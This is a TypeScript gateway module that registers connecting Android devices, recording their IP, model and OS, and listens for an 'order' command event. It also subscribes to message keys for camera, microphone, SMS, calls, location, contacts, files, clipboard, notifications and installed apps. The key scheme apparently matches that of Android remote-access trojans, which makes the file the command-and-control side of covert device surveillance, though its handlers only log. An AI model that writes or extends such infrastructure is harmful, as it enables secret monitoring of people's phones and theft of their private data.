import type { Socket } from 'socket.io';
import type { FastifyBaseLogger } from 'fastify';
import type { GatewayConfig } from '../config';

export const setupDeviceHandlers = (
  socket: Socket,
  clientParams: Record<string, string | string[] | undefined>,
  clientIP: string,
  config: GatewayConfig,
  logger: FastifyBaseLogger
) => {
  const deviceId = Array.isArray(clientParams.id)
    ? clientParams.id[0]
    : clientParams.id || socket.id;

  const model = Array.isArray(clientParams.model)
    ? clientParams.model[0]
    : clientParams.model;
  const manufacturer = Array.isArray(clientParams.manf)
    ? clientParams.manf[0]
    : clientParams.manf;
  const osVersion = Array.isArray(clientParams.release)
    ? clientParams.release[0]
    : clientParams.release;

  logger.info(`Device connected: ${deviceId} (${model || 'unknown'})`);

  // Register device with control-api
  fetch(`${config.controlApiUrl}/v1/devices`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      deviceId,
      model,
      manufacturer,
      osVersion,
      platform: 'android',
      status: 'online',
      lastIp: clientIP
    })
  }).catch((err) => {
    logger.warn(`Failed to register device with control-api: ${err.message}`);
  });

  // Handle device disconnection
  socket.on('disconnect', () => {
    fetch(`${config.controlApiUrl}/v1/devices/${deviceId}/status`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ status: 'offline' })
    }).catch((err) => {
      logger.warn(`Failed to update device status: ${err.message}`);
    });
  });

  // Forward commands from control-api (via socket events)
  socket.on('order', (payload) => {
    logger.debug(`Command received for ${deviceId}: ${payload.type}`);
    // Commands are handled by existing client code
  });

  // Handle client responses (forward to control-api if needed)
  const messageKeys = [
    '0xCA', // camera
    '0xFI', // files
    '0xCL', // call
    '0xSM', // sms
    '0xMI', // mic
    '0xLO', // location
    '0xCO', // contacts
    '0xWI', // wifi
    '0xNO', // notification
    '0xCB', // clipboard
    '0xIN', // installed
    '0xPM' // permissions
  ];

  messageKeys.forEach((key) => {
    socket.on(key, (data) => {
      logger.debug(`Message from ${deviceId}: ${key}`);
      // Data is already being sent to server, just log
    });
  });
};

